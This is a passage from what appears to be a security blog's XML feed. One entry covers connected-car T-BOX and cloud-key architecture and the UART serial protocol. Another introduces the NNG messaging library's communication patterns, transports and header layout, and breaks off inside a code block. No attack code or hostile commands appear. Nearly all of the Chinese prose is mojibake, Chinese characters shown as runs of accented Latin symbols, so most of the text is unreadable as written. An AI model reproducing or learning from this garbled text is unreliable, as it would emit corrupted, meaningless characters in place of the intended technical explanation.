BOX)ã€‚è´Ÿè´£è½¦æœºå†…éƒ¨çš„ä»¥å¤ªç½‘é€šä¿¡ï¼ŒåŒæ—¶æä¾›è”ç½‘èƒ½åŠ›ï¼Œå®ç°è½¦ç«¯ä¸äº‘å¹³å°(TSP)çš„è¿œç¨‹é•¿è¿æ¥ã€‚T-BOXå…·å¤‡ä¸€å®šCANæ€»çº¿çš„èƒ½åŠ›ï¼Œä¹Ÿæ˜¯æ•°å­—é’¥åŒ™(æ‰‹æœºæ§è½¦)çš„å®ç°è½½ä½“ã€‚é€šè¿‡æ•°å­—é’¥åŒ™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ‰‹æœºå¯¹è½¦è¾†è¿›è¡Œè¿œç¨‹æ“æ§(äº‘é’¥åŒ™)æˆ–è€…è¿‘åœºæ“æ§(è“ç‰™é’¥åŒ™ï¼ŒNFCé’¥åŒ™)ã€‚å…¶ä¸­äº‘é’¥åŒ™çš„å®ç°æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br> <img src="/mdimg/mqtt1/5.png"><br><strong>APP</strong>ï¼šæ‰‹æœºç«¯è½¦è”ç½‘åº”ç”¨ç¨‹åºã€‚å¤šæ•°è½¦è”ç½‘æ±½è½¦å‚å•†ä¼šå‘è½¦ä¸»æä¾›è½¦è”ç½‘åº”ç”¨ç¨‹åºï¼Œæ­¤ç±»APPé€šå¸¸å…·å¤‡ä»¥ä¸‹åŠŸèƒ½: è½¦ä¸»æœåŠ¡ï¼Œåº”ç”¨å•†åŸï¼Œè¿œç¨‹æ§è½¦ç­‰ã€‚</p><p><strong>TSP</strong>ï¼šè½¦è½½ä¿¡æ¯æœåŠ¡æä¾›å•†(TelematicsServiceProvider)ã€‚åœ¨è½¦è”ç½‘ç³»ç»Ÿä¸­ä»¥äº‘çš„å½¢å¼å‘ç”¨æˆ·ä¾§ä¸è½¦è¾†ä¾§æä¾›ä»¥ä¸‹æœåŠ¡ï¼šç”¨æˆ·ä¿¡æ¯ç»´æŠ¤ï¼Œè½¦è¾†å®šä½ï¼ŒçŠ¶æ€ç›‘æ§ç­‰ã€‚</p><h2 id="UARTåè®®"><a href="#UARTåè®®" class="headerlink" title="UARTåè®®"></a>UARTåè®®</h2><h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>é€šç”¨å¼‚æ­¥æ”¶å‘ä¼ è¾“å™¨ï¼ˆUniversal Asynchronous Receiver/Transmitter)ï¼Œé€šå¸¸ç§°ä½œUARTã€‚<br>å®ƒå°†è¦ä¼ è¾“çš„èµ„æ–™åœ¨ä¸²è¡Œé€šä¿¡ä¸å¹¶è¡Œé€šä¿¡ä¹‹é—´åŠ ä»¥è½¬æ¢ã€‚ä½œä¸ºæŠŠå¹¶è¡Œè¾“å…¥ä¿¡å·è½¬æˆä¸²è¡Œè¾“å‡ºä¿¡å·çš„èŠ¯ç‰‡ï¼ŒUARTé€šå¸¸è¢«é›†æˆäºå…¶ä»–é€šè®¯æ¥å£çš„è¿ç»“ä¸Šã€‚<br>å…·ä½“å®ç‰©è¡¨ç°ä¸ºç‹¬ç«‹çš„æ¨¡å—åŒ–èŠ¯ç‰‡ï¼Œæˆ–ä½œä¸ºé›†æˆäºå¾®å¤„ç†å™¨ä¸­çš„å‘¨è¾¹è®¾å¤‡ã€‚ä¸€èˆ¬æ˜¯RS-232Cè§„æ ¼çš„ï¼Œä¸ç±»ä¼¼Maximçš„MAX232ä¹‹ç±»çš„æ ‡å‡†ä¿¡å·å¹…åº¦å˜æ¢èŠ¯ç‰‡è¿›è¡Œæ­é…ï¼Œä½œä¸ºè¿æ¥å¤–éƒ¨è®¾å¤‡çš„æ¥å£ã€‚åœ¨UARTä¸Šè¿½åŠ åŒæ­¥æ–¹å¼çš„åºåˆ—ä¿¡å·å˜æ¢ç”µè·¯çš„äº§å“ï¼Œè¢«ç§°ä¸ºUSART(Universal Synchronous Asynchronous Receiver Transmitter)ã€‚</p><h3 id="æ¥çº¿"><a href="#æ¥çº¿" class="headerlink" title="æ¥çº¿"></a>æ¥çº¿</h3><p>ä¸€èˆ¬æƒ…å†µç¡¬ä»¶è¿æ¥æ¯”è¾ƒç®€å•ï¼Œä»…éœ€è¦3æ¡çº¿ï¼Œ<strong>æ³¨æ„è¿æ¥æ—¶ä¸¤ä¸ªè®¾å¤‡UARTç”µå¹³ï¼Œå¦‚ç”µå¹³èŒƒå›´ä¸ä¸€è‡´è¯·åšç”µå¹³è½¬æ¢åå†è¿æ¥</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><ul><li>TXï¼šå‘é€æ•°æ®ç«¯ï¼Œè¦æ¥å¯¹é¢è®¾å¤‡çš„RX</li><li>RXï¼šæ¥æ”¶æ•°æ®ç«¯ï¼Œè¦æ¥å¯¹é¢è®¾å¤‡çš„TX</li><li>GNDï¼šä¿è¯ä¸¤è®¾å¤‡å…±åœ°ï¼Œæœ‰ç»Ÿä¸€çš„å‚è€ƒå¹³é¢</li></ul><p><img src="/mdimg/mqtt1/6.png"><br><strong>1)æ­£å¸¸ USART æ¨¡å¼ä¸‹ï¼Œé€šè¿‡è¿™äº›å¼•è„šä»¥å¸§çš„å½¢å¼å‘é€å’Œæ¥æ”¶ä¸²è¡Œæ•°æ®ï¼š</strong></p><ul><li>å‘é€æˆ–æ¥æ”¶å‰ä¿æŒç©ºé—²çº¿è·¯</li><li>èµ·å§‹ä½</li><li>æ•°æ®ï¼ˆå­—é•¿ 8 ä½æˆ– 9 ä½ï¼‰ï¼Œæœ€ä½æœ‰æ•ˆä½åœ¨å‰</li><li>ç”¨äºæŒ‡ç¤ºå¸§ä¼ è¾“å·²å®Œæˆçš„ 0.5 ä¸ªã€1 ä¸ªã€1.5 ä¸ªã€2 ä¸ªåœæ­¢ä½</li><li>è¯¥æ¥å£ä½¿ç”¨å°æ•°æ³¢ç‰¹ç‡å‘ç”Ÿå™¨ - å¸¦ 12 ä½å°¾æ•°å’Œ 4 ä½å°æ•°</li><li>çŠ¶æ€å¯„å­˜å™¨ (USART_SR)</li><li>æ•°æ®å¯„å­˜å™¨ (USART_DR)</li><li>æ³¢ç‰¹ç‡å¯„å­˜å™¨ (USART_BRR) - 12 ä½å°¾æ•°å’Œ 4 ä½å°æ•°ã€‚</li><li>æ™ºèƒ½å¡æ¨¡å¼ä¸‹çš„ä¿æŠ¤æ—¶é—´å¯„å­˜å™¨ (USART_GTPR)ã€‚</li></ul><p><strong>2ï¼‰åœ¨åŒæ­¥æ¨¡å¼ä¸‹è¿æ¥æ—¶éœ€è¦ä»¥ä¸‹å¼•è„šï¼š</strong></p><ul><li><p>SCLKï¼šå‘é€å™¨æ—¶é’Ÿè¾“å‡ºã€‚è¯¥å¼•è„šç”¨äºè¾“å‡ºå‘é€å™¨æ•°æ®æ—¶é’Ÿï¼Œä»¥ä¾¿æŒ‰ç…§ SPI ä¸»æ¨¡å¼è¿›è¡ŒåŒæ­¥å‘é€ï¼ˆèµ·å§‹ä½å’Œç»“æŸä½ä¸Šæ— æ—¶é’Ÿè„‰å†²ï¼Œå¯é€šè¿‡è½¯ä»¶å‘æœ€åä¸€ä¸ªæ•°æ®ä½å‘é€æ—¶é’Ÿè„‰å†²ï¼‰ã€‚RX ä¸Šå¯åŒæ­¥æ¥æ”¶å¹¶è¡Œæ•°æ®ã€‚è¿™ä¸€ç‚¹å¯ç”¨äºæ§åˆ¶å¸¦ç§»ä½å¯„å­˜å™¨çš„å¤–è®¾ï¼ˆå¦‚ LCD é©±åŠ¨å™¨ï¼‰ã€‚æ—¶é’Ÿç›¸ä½å’Œææ€§å¯é€šè¿‡è½¯ä»¶ç¼–ç¨‹ã€‚åœ¨æ™ºèƒ½å¡æ¨¡å¼ä¸‹ï¼ŒSCLK å¯å‘æ™ºèƒ½å¡æä¾›æ—¶é’Ÿã€‚åœ¨ç¡¬ä»¶æµæ§åˆ¶æ¨¡å¼ä¸‹éœ€è¦ä»¥ä¸‹å¼•è„šï¼š</p></li><li><p>nCTSï¼šâ€œæ¸…é™¤ä»¥å‘é€â€ç”¨äºåœ¨å½“å‰ä¼ è¾“ç»“æŸæ—¶é˜»æ­¢æ•°æ®å‘é€ï¼ˆé«˜ç”µå¹³æ—¶ï¼‰ã€‚</p></li><li><p>nRTSï¼šâ€œè¯·æ±‚ä»¥å‘é€â€ç”¨äºæŒ‡ç¤º USART å·²å‡†å¤‡å¥½æ¥æ”¶æ•°æ®ï¼ˆä½ç”µå¹³æ—¶ï¼‰ã€‚</p><h3 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h3><p>UARTä½œä¸ºå¼‚æ­¥ä¸²å£é€šä¿¡åè®®çš„ä¸€ç§ï¼Œå·¥ä½œåŸç†æ˜¯å°†ä¼ è¾“æ•°æ®çš„æ¯ä¸ªå­—ç¬¦ä¸€ä½æ¥ä¸€ä½åœ°ä¼ è¾“ã€‚<br><img src="/mdimg/mqtt1/7.png"><br><img src="/mdimg/mqtt1/8.png"></p></li><li><p>èµ·å§‹ä½ï¼šå…ˆå‘å‡ºä¸€ä¸ªé€»è¾‘â€0â€çš„ä¿¡å·ï¼Œè¡¨ç¤ºä¼ è¾“å­—ç¬¦çš„å¼€å§‹ã€‚</p></li><li><p>èµ„æ–™ä½ï¼šç´§æ¥ç€èµ·å§‹ä½ä¹‹åã€‚èµ„æ–™ä½çš„ä¸ªæ•°å¯ä»¥æ˜¯4ã€5ã€6ã€7ã€8ç­‰ï¼Œæ„æˆä¸€ä¸ªå­—ç¬¦ã€‚é€šå¸¸é‡‡ç”¨ASCIIç ã€‚ä»æœ€ä½ä½å¼€å§‹ä¼ é€ï¼Œé æ—¶é’Ÿå®šä½ã€‚</p></li><li><p>å¥‡å¶æ ¡éªŒä½ï¼šèµ„æ–™ä½åŠ ä¸Šè¿™ä¸€ä½åï¼Œä½¿å¾—â€œ1â€çš„ä½æ•°åº”ä¸ºå¶æ•°(å¶æ ¡éªŒ)æˆ–å¥‡æ•°(å¥‡æ ¡éªŒ)ï¼Œä»¥æ­¤æ¥æ ¡éªŒèµ„æ–™ä¼ é€çš„æ­£ç¡®æ€§ã€‚</p></li><li><p>åœæ­¢ä½ï¼šå®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦æ•°æ®çš„ç»“æŸæ ‡å¿—ã€‚å¯ä»¥æ˜¯1ä½ã€1.5ä½ã€2ä½çš„é«˜ç”µå¹³ã€‚ ç”±äºæ•°æ®æ˜¯åœ¨ä¼ è¾“çº¿ä¸Šå®šæ—¶çš„ï¼Œå¹¶ä¸”æ¯ä¸€ä¸ªè®¾å¤‡æœ‰å…¶è‡ªå·±çš„æ—¶é’Ÿï¼Œå¾ˆå¯èƒ½åœ¨é€šä¿¡ä¸­ä¸¤å°è®¾å¤‡é—´å‡ºç°äº†å°å°çš„ä¸åŒæ­¥ã€‚å› æ­¤åœæ­¢ä½ä¸ä»…ä»…æ˜¯è¡¨ç¤ºä¼ è¾“çš„ç»“æŸï¼Œå¹¶ä¸”æä¾›è®¡ç®—æœºæ ¡æ­£æ—¶é’ŸåŒæ­¥çš„æœºä¼šã€‚é€‚ç”¨äºåœæ­¢ä½çš„ä½æ•°è¶Šå¤šï¼Œä¸åŒæ—¶é’ŸåŒæ­¥çš„å®¹å¿ç¨‹åº¦è¶Šå¤§ï¼Œä½†æ˜¯æ•°æ®ä¼ è¾“ç‡åŒæ—¶ä¹Ÿè¶Šæ…¢ã€‚</p></li><li><p>ç©ºé—²ä½ï¼šå¤„äºé€»è¾‘â€œ1â€çŠ¶æ€ï¼Œè¡¨ç¤ºå½“å‰çº¿è·¯ä¸Šæ²¡æœ‰èµ„æ–™ä¼ é€ã€‚</p></li><li><p>æ³¢ç‰¹ç‡ï¼šæ˜¯è¡¡é‡èµ„æ–™ä¼ é€é€Ÿç‡çš„æŒ‡æ ‡ã€‚è¡¨ç¤ºæ¯ç§’é’Ÿä¼ é€çš„ç¬¦å·æ•°ï¼ˆsymbolï¼‰ã€‚ä¸€ä¸ªç¬¦å·ä»£è¡¨çš„ä¿¡æ¯é‡ï¼ˆæ¯”ç‰¹æ•°ï¼‰ä¸ç¬¦å·çš„é˜¶æ•°æœ‰å…³ã€‚ä¾‹å¦‚ä¼ è¾“ä½¿ç”¨256é˜¶ç¬¦å·ï¼Œæ¯8bitä»£è¡¨ä¸€ä¸ªç¬¦å·ï¼Œèµ„æ–™ä¼ é€é€Ÿç‡ä¸º120å­—ç¬¦/ç§’ï¼Œåˆ™æ³¢ç‰¹ç‡å°±æ˜¯120baudï¼Œæ¯”ç‰¹ç‡æ˜¯120*8=960bit/sã€‚è¿™ä¸¤è€…çš„æ¦‚å¿µå¾ˆå®¹æ˜“æé”™ã€‚</p><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>ä»¥<code>9600 8N1</code>ï¼ˆ9600æ³¢ç‰¹ç‡ï¼Œ8ä¸ªæ•°æ®ä½ï¼Œæ²¡æœ‰æ ¡éªŒä½ï¼Œ1ä½åœæ­¢ä½ï¼‰ä¸ºä¾‹ï¼Œè¿™æ˜¯ç›®å‰æœ€å¸¸ç”¨çš„ä¸²å£é…ç½®ï¼Œç°åœ¨æˆ‘ä»¬ä¼ è¾“â€™Oâ€™â€™Kâ€™ä¸¤ä¸ªASCIIå€¼ï¼Œâ€™Oâ€™çš„ASCIIä¸º79ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ®ä¸º01001111 ï¼Œâ€™Kâ€™å¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ®ä¸º01001011 ï¼Œä¼ è¾“çš„æ ¼å¼æ•°æ®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/mdimg/mqtt1/9.png"><br>ä¸²å£æ³¢ç‰¹ç‡ä¸º9600ï¼Œ1bitä¼ è¾“æ—¶é—´å¤§çº¦ä¸º104usï¼Œä¼ é€ä¸€ä¸ªæ•°æ®å®é™…æ˜¯10ä¸ªæ¯”ç‰¹ï¼ˆå¼€å§‹ä½ï¼Œ8ä¸ªæ•°æ®ä½ï¼Œåœæ­¢ä½)ï¼Œä¸€ä¸ªbytesä¼ è¾“é€Ÿç‡å®é™…ä¸º9600*8/10=7680bpsã€‚</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¦è”ç½‘å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IoTå®‰å…¨ä¹‹NNGåè®®1</title>
    <link href="/2023/08/10/NNG1/"/>
    <url>/2023/08/10/NNG1/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p><a href="https://github.com/nanomsg/nng">NNG</a> æ˜¯ nanomsg çš„ç»§ä»»ç‰ˆæœ¬ï¼Œè€Œ nanomsg åˆ™æ˜¯æµè¡Œçš„ ZMQ ï¼ˆä¸€ä¸ªç®€å•å¥½ç”¨çš„ä¼ è¾“å±‚ï¼Œåƒæ¡†æ¶ä¸€æ ·çš„ä¸€ä¸ª socket libraryï¼‰çš„ C é‡å†™ç‰ˆã€‚</p><p>NNG å°†é€šä¿¡ä½¿ç”¨çš„åè®®å’Œä¼ è¾“åˆ†ç¦»ï¼ŒåŒä¸€ä¸ªåè®®å¯ä»¥å·¥ä½œåœ¨ä¸åŒçš„ä¼ è¾“å±‚ä¸Šï¼Œç±»ä¼¼ä¸ TCP/IP çš„åº”ç”¨å±‚å’Œä¼ è¾“å±‚çš„åˆ†å±‚ï¼ŒåŒæ—¶æ¥å£ä¸Šå±è”½äº†åº•å±‚ç»†èŠ‚ï¼Œç»Ÿä¸€ç”¨å­—ç¬¦ä¸² URL æ¥æè¿°ä¼ è¾“æ¨¡å¼ã€‚è¿™æ ·å½“ä½¿ç”¨åœºæ™¯ä¿®æ”¹æ—¶ï¼Œå¯ä»¥é€šè¿‡ç®€å•ä¿®æ”¹ URL æ¥å®ç°é€‚åº”ï¼Œæå…·çµæ´»æ€§ã€‚</p><p>åŒæ—¶å¦‚ NNG æè¿°æ‰€è¨€ â€œlight-weight brokerless messagingâ€ï¼ŒNNG ä¸­çš„é€šä¿¡å„æ–¹æ˜¯ä¸éœ€è¦ç¬¬ä¸‰æ–¹ç¨‹åºä»‹å…¥çš„ï¼Œè¿™ä¸ MQTT/Redis é€šä¿¡éœ€è¦æœåŠ¡å™¨ä¸åŒã€‚è¿™æ ·å¾ˆé€‚åˆä½œä¸ºé€šä¿¡åº“æ¥ä½¿ç”¨è€Œæ²¡æœ‰å…¶ä»–ä¾èµ–ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€äº› nng çš„ä¸»è¦ç‰¹ç‚¹ï¼š</p><ol><li>åè®®ç‹¬ç«‹æ€§ï¼š nng æä¾›äº†å¤šç§é€šä¿¡æ¨¡å¼ï¼ˆåè®®ï¼‰ï¼Œå¦‚è¯·æ±‚-å›å¤ã€å‘å¸ƒ-è®¢é˜…ã€æ¨é€-æ‹‰å–ç­‰ã€‚æ¯ç§æ¨¡å¼éƒ½æœ‰ç›¸åº”çš„åè®®ï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿæ ¹æ®åº”ç”¨ç¨‹åºçš„éœ€æ±‚é€‰æ‹©é€‚å½“çš„é€šä¿¡æ–¹å¼ã€‚</li><li>è½»é‡çº§ï¼š nng çš„è®¾è®¡ç€é‡äºä¿æŒè½»é‡çº§å’Œé«˜æ€§èƒ½ã€‚å®ƒä¸“æ³¨äºæä¾›åŸºæœ¬çš„é€šä¿¡æœºåˆ¶ï¼Œé¿å…è¿‡å¤šçš„å¤æ‚æ€§ã€‚</li><li>å¯æ‰©å±•æ€§ï¼š nng å…è®¸å¼€å‘äººå‘˜åœ¨éœ€è¦çš„æ—¶å€™æ·»åŠ æ–°çš„ä¼ è¾“åè®®ï¼Œä»¥é€‚åº”ä¸åŒçš„é€šä¿¡éœ€æ±‚ã€‚è¿™ä½¿å¾— nng åœ¨ä¸åŒçš„åœºæ™¯ä¸­éƒ½èƒ½å¤Ÿå‘æŒ¥ä½œç”¨ã€‚</li><li>é”™è¯¯å¤„ç†å’Œå¯é æ€§ï¼š nng è®¾è®¡äº†æ›´å¥½çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œä»¥ä¾¿åœ¨é€šä¿¡å‡ºç°é—®é¢˜æ—¶æ›´å¥½åœ°æŠ¥å‘Šå’Œå¤„ç†é”™è¯¯ã€‚å®ƒè¿˜æä¾›äº†ä¸€äº›åè®®ï¼Œå¦‚ REQ/REPï¼Œä»¥å®ç°å¯é çš„è¯·æ±‚å’Œå›å¤æ¨¡å¼ã€‚</li><li>å¼‚æ­¥é€šä¿¡ï¼š nng æ”¯æŒå¼‚æ­¥é€šä¿¡æ¨¡å¼ï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿå®ç°é«˜æ•ˆçš„å¹¶å‘æ“ä½œã€‚</li><li>è·¨å¹³å°ï¼š nng å¯åœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬ Linuxã€Windows å’Œ macOSã€‚</li></ol><h2 id="é€šä¿¡åè®®"><a href="#é€šä¿¡åè®®" class="headerlink" title="é€šä¿¡åè®®"></a>é€šä¿¡åè®®</h2><ul><li>PAIR ä¸€å¯¹ä¸€åŒå‘é€šä¿¡ã€‚</li><li>PIPELINE(PUSH/PULL) å•å‘é€šä¿¡ï¼Œç±»ä¼¼ä¸ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚</li><li>PUB/SUB å•å‘å¹¿æ’­ã€‚</li><li>REQ/REP è¯·æ±‚-åº”ç­”æ¨¡å¼ï¼Œç±»ä¼¼ä¸ RPC æ¨¡å¼ã€‚</li><li>BUS ç½‘çŠ¶è¿æ¥é€šä¿¡ï¼Œæ¯ä¸ªåŠ å…¥èŠ‚ç‚¹éƒ½å¯ä»¥å‘é€/æ¥å—å¹¿æ’­æ¶ˆæ¯ã€‚</li><li>SURVEY ç”¨äºå¤šèŠ‚ç‚¹è¡¨å†³æˆ–è€…æœåŠ¡å‘ç°ã€‚</li></ul><h2 id="ä¼ è¾“æ¨¡å¼"><a href="#ä¼ è¾“æ¨¡å¼" class="headerlink" title="ä¼ è¾“æ¨¡å¼"></a>ä¼ è¾“æ¨¡å¼</h2><ul><li>inproc è¿›ç¨‹å†…çº¿ç¨‹é—´ä¼ è¾“</li><li>ipc ä¸»æœºå†…è¿›ç¨‹é—´ä¼ è¾“</li><li>tcp ç½‘ç»œå†…ä¸»æœºé—´ä¼ è¾“</li></ul><h2 id="é€šè®¯æ¨¡å¼"><a href="#é€šè®¯æ¨¡å¼" class="headerlink" title="é€šè®¯æ¨¡å¼"></a>é€šè®¯æ¨¡å¼</h2><ol><li>ä¸åŒæœºå™¨è¿›ç¨‹é—´ï¼š<br>TCP - network transport via TCP<br>WS - websockets over TCP<br>æœåŠ¡ç«¯ï¼šâ€tcp://*:5555â€<br>å®¢æˆ·ç«¯ï¼šâ€tcp://localhost:5555â€</li><li>åŒå°æœºå™¨è¿›ç¨‹é—´ï¼š<br>IPC - transport between processes on a single machine<br>ipc:///tmp/reqrep.ipc</li></ol><p>â€‹     INPROC - transport within a process (between threads, modules etc.)</p><ol><li>åŒè¿›ç¨‹çš„çº¿ç¨‹ï¼Œæ¨¡å—é—´é€šä¿¡ï¼š<br>â€œinproc://rot13â€</li></ol><p>é€šä¿¡åè®®é‡Œé™¤äº† PAIR ä¹‹å¤–ï¼ŒåŸºæœ¬éƒ½æ˜¯ä¸€å¯¹å¤šçš„é€šä¿¡æ¨¡å¼ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ã€‚</p><p>ä»¥ PIPELINE å’Œ PUB/SUB ä¸ºä¾‹ï¼š</p><ul><li>PIPELINE çš„ PUSH ç«¯æ˜¯ clientï¼Œä¸€ä¸ª PUSH å¯ä»¥è¿æ¥å¤šä¸ª PULL ç«¯ï¼Œå‘é€æ•°æ®æ—¶ä¼šé€‰æ‹©å…¶ä¸­ä¸€ä¸ªå¯ç”¨çš„å‘é€ï¼›PULL ç«¯æ˜¯ serverï¼Œä¸€ä¸ª PULL å¯ä»¥æ¥æ”¶å¤šä¸ª PUSH è¿æ¥å’Œæ•°æ®ã€‚</li><li>PUB/SUB çš„ SUB ç«¯æ˜¯ clientï¼Œä¸€ä¸ª SUB å¯ä»¥è¿æ¥å¤šä¸ªä¸åŒçš„ PUB ç«¯ï¼Œæ¥æ”¶å¤šä¸ª PUB ç«¯å¹¿æ’­çš„æ•°æ®ï¼›PUB ç«¯æ˜¯ serverï¼Œä¸€ä¸ª PUB å¯ä»¥æ¥æ”¶å¤šä¸ª SUB è¿æ¥å¹¶å¹¿æ’­æ•°æ®ã€‚</li></ul><p>åŸºäºä»¥ä¸Šï¼Œå¤šä¸ªç¨‹åºæ˜¯æ²¡åŠæ³•å…±ç”¨ä¸€ä¸ª PUB/SUB é€šé“æ¥å¹¿æ’­æ•°æ®çš„ï¼Œè¿™ä¸ ROS é‡Œçš„ topic å’Œ LCM ä¸­çš„ channel æ¨¡å¼ä¸åŒã€‚å¦‚æœè¦å®ç°ç±»ä¼¼åŠŸèƒ½ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ PIPELINE + PUB/SUB æ¥å¤„ç†ï¼š</p><ul><li>ç‹¬ç«‹ä¸€ä¸ªè¯é¢˜å‘å¸ƒçš„ç¨‹åºï¼Œæ‹¥æœ‰ä¸€ä¸ª PULL å’Œ PUBã€‚</li><li>PULL çº¦å®šä¸€ä¸ª URLï¼Œæ‰€æœ‰éœ€è¦å‘å¸ƒè¯¥è¯é¢˜çš„ç¨‹åºéƒ½ PUSH æ•°æ®åˆ°è¯¥ URL ä¸Šã€‚</li><li>PUB çº¦å®šä¸€ä¸ª URLï¼Œæ‰€æœ‰éœ€è¦è·å–è¯¥è¯é¢˜çš„ç¨‹åºéƒ½ SUB åˆ°è¯¥ URL ä¸Šã€‚</li><li>ç¨‹åºå†…éƒ¨å¾ªç¯å°† PULL è¯»å–çš„æ•°æ®å‘é€åˆ° PUB ä¸Šã€‚</li><li>ä»¥ä¸Šåˆ™å¯ä»¥æ¨¡æ‹Ÿå‡º ROS topic æ•°æ®åˆå¹¶ æˆ–è€… LCM ä¸­ channel çš„ç±»ä¼¼åŠŸèƒ½ã€‚</li></ul><p>æ•´ä½“ä¸Šçœ‹ï¼ŒNNG çš„ API å¾ˆç®€çº¦ï¼Œä¸»è¦æ˜¯ 4 ä¸ªï¼Œopen/recv/send/closeï¼Œopen æ ¹æ®åè®®ä¸åŒä½¿ç”¨çš„å‡½æ•°ä¼šä¸åŒã€‚é…ç½®åˆ™æ˜¯ setopt/getoptï¼Œä¸ UNIX API ç±»ä¼¼ã€‚API ä¸­æ²¡æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆcontext-lessï¼‰ä¾èµ–ï¼Œåªéœ€è¦ä¸€ä¸ª nng_socketï¼Œè¿™ç§è®¾è®¡å’Œå®ç°æ–¹æ³•å€¼å¾—å»å­¦ä¹ ä¸€ä¸‹ï¼ˆåˆæ­¥æ£æµ‹åº”è¯¥æ˜¯ä½¿ç”¨æŒ‡é’ˆå€¼ä½œä¸ºhandleï¼Œå¦‚æœè¦å¼ºåˆ¶ç¼–è¯‘å™¨åšç±»å‹æ£€æµ‹ï¼Œåˆ™ä¼šå¥—ä¸Šä¸€å±‚ structï¼Œå¦‚ <code>typedef struct &#123; _nng_xxx_socket * p &#125; nng_socket;</code></p><p>NNG åè®®åŸºæœ¬ä¸Šå›Šæ‹¬äº†å¸¸è§çš„é€šä¿¡éœ€æ±‚ï¼Œä¸€äº›ç‰¹æ®Šçš„éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç»„åˆåè®®æ¥å®ç°ï¼Œæ¯”å¦‚ä¸Šé¢çš„æ¨¡æ‹Ÿ ROS topic æˆ–è€… LCM channel çš„æ–¹æ³•ã€‚è¿™æ ·ä¸€æ¥ï¼Œå¦‚æœåœ¨ç¨‹åºä¸­ä½¿ç”¨ NNGï¼Œä¸ç®¡æ˜¯å¤šè¿›ç¨‹ï¼Œè¿˜æ˜¯å¤šçº¿ç¨‹ï¼Œé€šè¿‡è®¾è®¡ï¼Œå¯ä»¥è¿›ä¸€æ­¥å¢å¼ºæ¨¡å—åŒ–ï¼ŒåŒæ—¶ä¸ä¹çµæ´»æ€§ã€‚å¦‚æœç¯å¢ƒå˜åŒ–ï¼Œç¨‹åºä¸ç®¡æ˜¯ç”±å¤šè¿›ç¨‹æ”¹æˆå¤šçº¿ç¨‹ï¼Œè¿˜æ˜¯ç”±å¤šçº¿ç¨‹æ”¹æˆå¤šä¸»æœºï¼Œéƒ½å¾ˆå®¹æ˜“å®ç°ã€‚</p><p>å¸¸è§æ¨¡å—/è¿›ç¨‹/çº¿ç¨‹é—´é€šä¿¡ï¼Œå¯ä»¥ä¾æ®å…·ä½“éœ€æ±‚æ¥ä½¿ç”¨ PIPELINEï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ï¼‰ è¿˜æ˜¯ REQ/REPï¼ˆè¿‡ç¨‹è°ƒç”¨ï¼‰ï¼Œè€Œä¸æ˜¯é”+å…¨å±€å˜é‡ï¼Œæ¯ä¸ªæ¨¡å—å•å…ƒåªéœ€è¦åšå•ä¸€ç›¸å…³çš„å…·ä½“äº‹åŠ¡ï¼Œæ— éœ€çŸ¥æ™“å…¨å±€çŠ¶æ€ã€‚</p><h2 id="ä»£ç ç»“æ„"><a href="#ä»£ç ç»“æ„" class="headerlink" title="ä»£ç ç»“æ„"></a>ä»£ç ç»“æ„</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">nng.h:</span><br></code></pre></td></tr></table></figure><p>nngå¯¹å¤–æš´éœ²çš„ api æ¥å£</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">transport.h:</span><br></code></pre></td></tr></table></figure><p>é€šä¿¡å±‚å®šä¹‰ï¼Œä¸»è¦æ˜¯ä¸ºäº†æš´éœ²ç»™ç”¨æˆ·ä»¥å®ç°æ‰©å±•ï¼Œä½†ç›®å‰åŒ…å«äº†utilsä¸‹çš„ç›¸å…³å¤´æ–‡ä»¶ï¼Œå…¶ä¸­<code>inproc.h/ipc.h/tcp.h</code>æ˜¯å¯¹åº”çš„transport</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">protocol.h:</span><br></code></pre></td></tr></table></figure><p>åè®®å±‚å®šä¹‰ï¼Œä¹Ÿæ˜¯ä¸ºäº†æš´éœ²ç»™ç”¨æˆ·ä»¥å®ç°æ‰©å±•ï¼Œå…¶ä¸­<code>reqrep.h/pubsub.h/bus.h/pair.h/pipeline.h/survey.h</code>æ˜¯å¯¹åº”çš„protocol</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span 